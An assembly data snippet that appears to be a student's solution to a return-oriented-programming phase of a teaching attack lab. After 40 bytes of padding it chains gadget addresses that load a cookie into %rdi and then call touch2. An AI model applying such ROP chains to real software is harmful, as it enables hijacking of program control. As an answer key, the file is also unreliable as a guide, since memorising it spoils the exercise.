stack:
  .ascii "0123456789012345678901234567890123456789"

  .quad 0x4019ab  /* popq %rax */
  .quad 0x59b997fa  /* cookie */
  .quad 0x4019a2  /* movq %rax, %rdi */
  .quad 0x4017ec  /* callq <touch2> */
